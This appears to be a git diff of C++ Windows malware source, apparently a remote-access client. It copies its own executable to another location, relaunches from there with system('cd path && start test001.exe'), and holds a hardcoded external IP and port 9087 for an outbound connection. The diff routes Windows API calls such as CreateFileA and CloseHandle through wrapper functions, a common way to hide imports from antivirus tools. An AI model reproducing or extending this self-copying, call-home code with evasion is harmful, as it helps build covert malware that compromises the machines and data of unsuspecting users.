@@ -3,7 +3,6 @@
 #include <iostream>
 #include <intrin.h>
 #include "Connection.h"
-#include "Functions.h"
 
 
 Functions *functions = new Functions();
@@ -34,21 +33,22 @@ bool moveFilePlace() {
     }
 
 
-    HANDLE hFileRead = ::CreateFileA(szExeFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
-                                     OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    HANDLE hFileWrite = ::CreateFileA(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                      NULL,
-                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFileRead = functions->CreateFileA_Function(szExeFileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                                       NULL,
+                                                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFileWrite = functions->CreateFileA_Function(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                                        NULL,
+                                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
     cout << "path is " << path << endl;
     if (hFileRead == INVALID_HANDLE_VALUE) {
         cout << "Cant open handle to the file" << endl;
-        CloseHandle(hFileRead);
+        functions->CloseHandle_Function(hFileRead);
         return false;
 
     } else if (hFileWrite == INVALID_HANDLE_VALUE) {
         cout << "Cant open handle to file2" << endl;
-        CloseHandle(hFileWrite);
+        functions->CloseHandle_Function(hFileWrite);
         return false;
     }
 
@@ -58,8 +58,8 @@ bool moveFilePlace() {
         functions->ReadFile_Function(hFileRead, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
         functions->WriteFile_Function(hFileWrite, buffer.data(), bytesRead, NULL, NULL);
     }
-    CloseHandle(hFileWrite);
-    CloseHandle(hFileRead);
+    functions->CloseHandle_Function(hFileWrite);
+    functions->CloseHandle_Function(hFileRead);
     return true;
 }
 
@@ -73,7 +73,7 @@ int main() {
         system(("cd " + path + "&& start test001.exe").c_str());
         return 0;
     } else {
-        //::ShowWindow(::GetConsoleWindow(), SW_SHOW);fdsafdsafdsaf
+        //::ShowWindow(functions->GetConsoleWindow_Function, SW_SHOW);
         string ip = "141.226.121.68";
         //string ip = "192.168.1.210";
         int port = 9087;
